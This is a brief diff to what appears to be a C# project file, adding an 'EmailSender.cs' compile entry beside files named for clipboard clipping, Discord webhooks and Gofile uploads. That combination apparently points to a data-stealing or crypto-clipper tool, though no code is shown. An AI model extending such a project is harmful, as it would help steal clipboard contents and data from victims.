@@ -223,6 +223,7 @@
     <Compile Include="Clipper\Patterns.cs" />
     <Compile Include="Config.cs" />
     <Compile Include="DiscordWebHook.cs" />
+    <Compile Include="EmailSender.cs" />
     <Compile Include="Helpers\GofileFileService.cs" />
     <Compile Include="Helpers\ClipboardManager.cs" />
     <Compile Include="Helpers\CommandHelper.cs" />
